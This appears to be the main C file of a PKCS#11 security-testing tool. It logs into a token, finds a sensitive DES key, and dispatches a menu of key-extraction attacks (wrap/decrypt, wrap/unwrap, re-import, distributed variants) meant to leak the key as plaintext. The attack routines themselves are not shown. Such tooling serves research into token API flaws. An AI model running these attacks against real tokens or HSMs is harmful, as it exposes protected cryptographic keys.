#include <stdlib.h>
#include <stdio.h>
#include "pkcs11_unix.h"
#include "utils.h"
#include "attacks.h"

int
main(int argc, char **argv) {
	CK_SLOT_ID slot;
	CK_SESSION_HANDLE session;
	CK_OBJECT_HANDLE key;
	CK_OBJECT_CLASS class_secret = CKO_SECRET_KEY;
	CK_KEY_TYPE type_des = CKK_DES;
	CK_BYTE key_value[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
	CK_BYTE *pin = NULL;
	CK_BBOOL yes = CK_TRUE;
	CK_BBOOL no  = CK_FALSE;
	CK_ATTRIBUTE template_sensitive[] = {
		{CKA_LABEL,     "MyPrecious",  10},
		{CKA_CLASS,     &class_secret, sizeof(class_secret)},
		{CKA_KEY_TYPE,  &type_des,     sizeof(type_des)},
		{CKA_TOKEN,     &yes,          sizeof(CK_BBOOL)},
		{CKA_SENSITIVE, &yes,          sizeof(CK_BBOOL)},
		{CKA_ENCRYPT,   &yes,          sizeof(CK_BBOOL)},
		{CKA_DECRYPT,   &yes,          sizeof(CK_BBOOL)},
		{CKA_WRAP,      &yes,          sizeof(CK_BBOOL)},
		{CKA_UNWRAP,    &yes,          sizeof(CK_BBOOL)},
		{CKA_VALUE,     key_value,     sizeof(key_value)}
	};
	CK_ULONG template_sensitive_len = 10;
	CK_ATTRIBUTE_PTR template_empty = NULL;
	int choice = 0;

	if(argc != 3) {
		die("Please provide a slot and a valid PIN");
	}
	pin = (CK_BYTE *) argv[2];
	initialize();
	slot = get_slot(atoi(argv[1]));
	session = start_session(slot);
	login(session, pin);
	/* show all the available keys */
	printf("[I] Listing all the available keys\n");
	enumerate_keys(session, template_empty, 0);
	/* get the first key having the MyPrecious label */
	key = get_key(session, template_sensitive, 1);
	
	printf("[I] Choose one of the following attacks...\n"
	       " 1) Wrap/Decrypt\n"
	       " 2) Wrap/Unwrap (self)\n"
	       " 3) Re-Import\n"
	       " 4) Distributed Wrap/Decrypt (Wrap)\n"
	       " 5) Distributed Wrap/Decrypt (Decrypt)\n"
	       "    ...or one administrative action\n"
	       " 8) Create a sensitive wrap/decrypt key\n"
	       " 9) Create a sensitive key\n\n"
	       " Your choice: ");
	choice = getchar();
	/* try to leak the key value as plaintext, in many different ways! */
	if(choice == '1') {
		printf("[A] Wrap-Decrypt attempt\n");
		attack_wrap_decrypt(session, key);
	} else if(choice == '2') {
		printf("[A] Wrap-Unwrap attempt\n");
		attack_wrap_unwrap_self(session, key);
	} else if(choice == '3') {
		printf("[A] Re-import attempt\n");
		attack_re_import(session, key);
	} else if(choice == '4') {
		printf("[A] Distributed Wrap-Decrypt attempt (1)\n");
		attack_distr_wrap(session, key);
	} else if(choice == '5') {
		printf("[A] Distributed Wrap-Decrypt attempt (2)\n");
		attack_distr_decrypt(session);
	} else if(choice == '8') {
		printf(" *  Creating a sensitive key for wrapping and unwrapping\n");
		// create_sensitive_wrapping_key(session);
	} else if(choice == '9') {
		printf(" *  Creating a sensitive key\n");
		create_object(session, template_sensitive, template_sensitive_len, &key);
	} else {
		printf("Invalid attack, bye...\n");
	}

	logout(session);
	end_session(session);
	finalize();

	return EXIT_SUCCESS;
}
